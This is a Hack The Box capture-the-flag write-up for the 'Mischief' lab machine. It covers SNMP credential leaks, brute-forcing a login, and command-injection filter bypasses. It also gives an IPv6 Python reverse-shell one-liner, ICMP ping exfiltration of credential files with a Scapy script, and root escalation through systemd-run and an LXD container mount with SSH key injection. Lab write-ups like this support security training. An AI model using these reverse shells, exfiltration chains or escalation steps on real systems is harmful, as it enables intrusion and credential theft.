---
icon: starfighter
cover: ../../../../.gitbook/assets/Screenshot 2026-02-23 015358.png
coverY: -19.55359605127994
---

# HTB-MISCHIEF

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan (TCP)

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ rustscan -a 10.10.10.92 blah blah 
```

```
Open 10.10.10.92:22
Open 10.10.10.92:3366

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4
3366/tcp open  http    SimpleHTTP/0.6 Python/2.7.15rc1
| http-auth:
|_  Basic realm=Test
```

**Why this matters:** Port 3366 running a Python SimpleHTTP server with Basic Auth is unusual — the process arguments for it are likely accessible via SNMP, leaking credentials.

#### Port Scan (UDP — SNMP)

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ sudo nmap -sU -p 161 -sC -oA scans/nmap-snmp 10.10.10.92
```

```
161/udp open  snmp
| snmp-processes:
|   Name: python
|   Name: apache2
```

**Why this matters:** Apache is running but wasn't found on TCP — it's likely listening on IPv6 only. SNMP will also reveal the IPv6 address.

***

### SNMP Enumeration

#### Setup

Install mibs for human-readable output:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ sudo apt install snmp-mibs-downloader
```

Comment out the mibs line in `/etc/snmp/snmp.conf` to enable them.

#### Dump Full SNMP

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ snmpwalk -v 2c -c public 10.10.10.92 > snmpwalk.txt
```

#### Find Web Server Credentials via Process Arguments

Locate the Python process ID:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ snmpwalk -v 2c -c public 10.10.10.92 hrSWRunName | grep python

HOST-RESOURCES-MIB::hrSWRunName.617 = STRING: "python"
```

Query the full process table entry for PID 617:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ snmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep 617

HOST-RESOURCES-MIB::hrSWRunParameters.617 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
```

**Why this matters:** Process command-line arguments are stored in SNMP's `hrSWRunParameters` OID — any process started with credentials in its arguments leaks them to anyone with SNMP read access.

Credentials extracted: `loki:godofmischiefisloki`

#### Discover IPv6 Address via SNMP

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ snmpwalk -v 2c -c public 10.10.10.92 ipAddressType

IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:8f:dd:d4" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:8f:dd:d4" = INTEGER: unicast(1)
```

Alternatively using Enyx (disable mibs first — recomment the line in `snmp.conf`):

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ python /opt/Enyx/enyx.py 2c public 10.10.10.92

[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:fe8f:ddd4
[+] Link Local   -> fe80:0000:0000:0000:0250:56ff:fe8f:ddd4
```

**Why this matters:** SNMP exposes the IPv6 address — Apache is only listening on IPv6 and would be completely invisible otherwise.

> Note: The IPv6 address changes on machine reset. Always re-enumerate after a reset.

***

### Web TCP 3366 (Python SimpleHTTPAuthServer)

Visiting `http://10.10.10.92:3366` prompts for Basic Auth. Using the creds from SNMP:

```
loki:godofmischiefisloki
```

The hosted page reveals two credential pairs:

```
loki:godofmischiefisloki
loki:trickeryanddeceit
```

***

### Port Scan IPv6

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ nmap -6 -sT -p- --min-rate 5000 dead:beef:0000:0000:0250:56ff:fe8f:ddd4 -oA scans/nmap-ipv6
```

```
22/tcp open  ssh
80/tcp open  http   Apache httpd 2.4.29
```

Apache is confirmed on port 80, IPv6 only.

***

### Web — IPv6 / TCP 80 (Command Execution Panel)

Visiting `http://[dead:beef::250:56ff:fe8f:ddd4]/` shows a "Command Execution Panel" with a login form at `/login.php`.

Neither loki credential pair works directly. We brute-force common usernames with the known passwords:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ hydra -6 dead:beef::250:56ff:fe8f:ddd4 \
  -L /opt/SecLists/Usernames/top-usernames-shortlist.txt \
  -P passwords.txt \
  http-form-post "/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match"

[80][http-form-post] host: dead:beef::... login: administrator password: trickeryanddeceit
```

**Why this matters:** The password was found on port 3366 but applied to a different username — credential reuse across services with a different username pair.

#### Enumerating the Command Filter

After logging in, the panel runs shell commands but shows no output and blocks several tools. We script a filter test using curl:

```bash
#!/bin/bash
for cmd in $(cat wordlist.txt); do
    curl -s -6 -X POST "http://[dead:beef::250:56ff:fe8f:ddd4]:80/" \
      -H "Cookie: PHPSESSID=YOURSESSION" \
      -d "command=${cmd}" | grep -q "Command is not allowed."
    if [ $? -eq 1 ]; then
        echo -e "\e[42m${cmd}\e[49m allowed"
    else
        echo -e "\e[41m${cmd}\e[49m blocked"
    fi
done
```

Blocked strings (found via the filter script and confirmed in source): `nc`, `bash`, `chown`, `setfacl`, `chmod`, `perl`, `find`, `locate`, `ls`, `php`, `wget`, `curl`, `dir`, `ftp`, `telnet`.

**Why this matters:** Simple string-based blacklists are trivially bypassed using semicolons for output chaining, wildcards for filename matching, or alternate commands.

#### Recovering Output via Semicolon Injection

The filter runs the command as `system("$cmd > /dev/null 2>&1")`. Adding a second command after a `;` appends its output to the response:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ cat run_command.sh
#!/bin/bash
ip=$1
cmd=$2
curl -s -6 -X POST "http://[${ip}]:80/" \
  -d "command=${cmd};" \
  | grep -F "</html>" -A 10 \
  | grep -vF -e "</html>" -e "Command was executed successfully!"

┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ ./run_command.sh dead:beef::250:56ff:fe8f:ddd4 id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Reading Loki's Credentials (Wildcard Bypass)

`credentials` is a blacklisted string. Using a wildcard bypasses it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ ./run_command.sh dead:beef::250:56ff:fe8f:ddd4 "cat /home/loki/credential?"

pass: lokiisthebestnorsegod
```

#### Bonus — RCE Without Authentication

The PHP source executes the POST `command` parameter outside the authentication check block — after `</html>`. Any unauthenticated request with the right parameter gets code execution:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ curl -s -6 -d "command=cat /home/loki/cred*;" -X POST \
  'http://[dead:beef::250:56ff:fe8f:ddd4]:80/'

pass: lokiisthebestnorsegod
Command was executed successfully!
```

Parameter name discovery takes under 6 seconds with wfuzz — no login required.

**Why this matters:** Authentication logic placed before the HTML closing tag but after the execution logic is a structural PHP mistake — the order of the code blocks determines what is gated behind auth.

***

### Shell as www-data (IPv6 Reverse Shell)

IPv4 reverse shells are dropped by iptables. IPv6 has no outbound restrictions — we use `socket.AF_INET6` in the Python reverse shell.

Start listener on our IPv6 address:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ nc -6 -lnvp 443
```

Send the shell via command injection:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ ./run_command.sh dead:beef::250:56ff:fe8f:ddd4 \
  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::1020\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

```
Ncat: Connection from dead:beef::250:56ff:fe8f:ddd4:48882.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why this matters:** iptables blocks all IPv4 outbound except SSH and 3366. ip6tables has no such rules — the firewall only covers one protocol family.

***

### Shell as loki

From the www-data shell, we `su` to loki using the password found in credentials:

```
www-data@Mischief:/home/loki$ su loki
Password: lokiisthebestnorsegod

loki@Mischief:~$ cat user.txt
bf58078e************************
```

Alternatively, use the credential from the command injection directly to SSH in:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ ssh loki@10.10.10.92
Password: lokiisthebestnorsegod

loki@Mischief:~$
```

***

### Privilege Escalation — loki → root

#### bash\_history Credential Leak

```
loki@Mischief:~$ cat .bash_history

python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
```

A different password is visible — this turns out to be root's password. However:

```
loki@Mischief:~$ su
-bash: /bin/su: Permission denied
```

**Why this matters:** File Access Control Lists (facl) can extend standard Unix permissions. loki has been explicitly denied execute on `/bin/su` via a user-level ACL entry.

Confirm with:

```
loki@Mischief:~$ getfacl /bin/su

user::rwx
user:loki:r--    <-- execute denied for loki specifically
group::r-x
other::r-x
```

#### Method 1 — su via www-data Shell

www-data is not restricted by the ACL. From the existing www-data reverse shell:

```
www-data@Mischief:/var/www/html$ su
Password: lokipasswordmischieftrickery

root@Mischief:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Method 2 — systemd-run (Authenticated as loki)

`systemd-run` bypasses the ACL restriction and lets loki spawn processes as root after authenticating:

```
loki@Mischief:~$ systemd-run python -c \
  'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1020",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Authenticating as: root
Password: lokipasswordmischieftrickery
==== AUTHENTICATION COMPLETE ===
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ nc -6 -lnvp 443

# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Method 3 — lxc Container Escape (Patched)

This method was available at release but patched on July 16. Loki was originally in the `lxd` group, allowing container creation with the host filesystem mounted inside:

```
loki@Mischief:/dev/shm$ lxc image import alpine-v3.8-x86_64.tar.gz --alias alpine
loki@Mischief:/dev/shm$ lxd init   # initialize storage pool
loki@Mischief:/dev/shm$ lxc init alpine priv -c security.privileged=true
loki@Mischief:/dev/shm$ lxc config device add priv host-root disk source=/ path=/mnt/root/
loki@Mischief:/dev/shm$ lxc start priv
loki@Mischief:/dev/shm$ lxc exec priv /bin/sh

~ # id
uid=0(root) gid=0(root)

/mnt/root/root # ls
root.txt
```

SSH key injection from inside the container to get persistent root access:

```
/mnt/root/root # mkdir .ssh
/mnt/root/root/.ssh # echo "ssh-ed25519 AAAA...sn0x_pubkey..." >> authorized_keys
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ ssh -i ~/.ssh/id_ed25519 root@10.10.10.92

root@Mischief:~#
```

***

### Bonus ICMP Data Exfiltration

Before discovering the semicolon output trick, a full ICMP exfil approach works when all TCP/UDP outbound is blocked. The `ping` `-p` flag accepts up to 16 hex bytes as a pattern to embed in the ICMP payload.

#### Manual Approach

```
# On target via command injection:
ping -c 1 -p $(echo "GOKUUUUUUUUUUUUUUU" | cat /home/loki/cred* - | xxd -p -l 16 -s 0) 10.10.14.32
```

Capture on attacker:

```
┌──(sn0x㉿sn0x)-[~/HTB/Mischief]
└─$ sudo tcpdump -i tun0 -nnXSs 0 icmp
```

ICMP payload offset `0x28` contains 16 bytes of file content per ping. Increment `-s` offset by 16 for each subsequent 16-byte chunk.

#### Scripted Approach

A Python script using Scapy sniffs ICMP echo requests in a background thread, reassembles payload chunks, and detects a marker (GOKUUUUUUUUUUUUUUU) to signal end-of-file:

```python
#!/usr/bin/env python3

import requests
import sys
from scapy.all import *
from threading import Thread

buf = ''
marker = "GOKU"

def parse_ping(pkt):
    global buf
    setmarker = set(marker)
    buf += pkt[ICMP].load[16:32].decode('utf-8')
    if set(buf[-4:]) == setmarker:
        if set(buf) != setmarker:
            buf = buf[:buf.index(marker)]
            print(f"{buf}")
        buf = ''

def sniffer():
    sniff(iface="tun0", filter="icmp[icmptype] == 8", prn=parse_ping)

sniff_thread = Thread(target=sniffer)
sniff_thread.daemon = True
sniff_thread.start()

ip = sys.argv[1] if len(sys.argv) > 1 else input("ip: ")

data = """(echo "{marker}" | cat {cmd} -) | xxd -p | tr -d '\\n' | fold -w 32 | while read data; do ping -c 1 -p $data 10.10.14.32; done;"""

while True:
    try:
        cmd = input("filename: ")
        print()
        resp = requests.post(f'http://{ip}/',
            data=f"command={data.format(cmd=cmd, marker=marker*4)}",
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if "Command is not allowed." in resp.text:
            print("Name filtered. Try again")
    except (requests.exceptions.ConnectionError, KeyboardInterrupt):
        sys.exit()
```

**Why this matters:** When all outbound TCP/UDP is firewalled and there's no direct output, ICMP echo requests are often overlooked. The ping `-p` pattern flag turns a diagnostic tool into a covert data channel.

***

### Attack Flow

```
SNMP process args → credentials for port 3366 (loki:godofmischiefisloki)
SNMP ipAddressType → IPv6 address (dead:beef::...)
    |
    +--[3366]--> hosted page → second credential pair
    |
    +--[IPv6:80]--> Command Execution Panel
                    --> hydra bruteforce (administrator:trickeryanddeceit)
                    --> Semicolon bypass → output recovery
                    --> Wildcard bypass → credential file read
                    --> OR: unauthenticated RCE (no-auth code path)
                    --> IPv6 reverse shell (AF_INET6, iptables bypass)
                        --> www-data shell
                            --> su loki (lokiisthebestnorsegod)
                                --> user.txt
                    |
                    +--[Privesc]
                        --> .bash_history → root password leak
                        --> Method 1: su via www-data shell (no facl restriction)
                        --> Method 2: systemd-run (loki authenticates as root)
                        --> Method 3: lxc container escape (patched)
                            --> Host filesystem mounted in container
                                --> root.txt (hidden at non-standard path)
                                

```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>

***
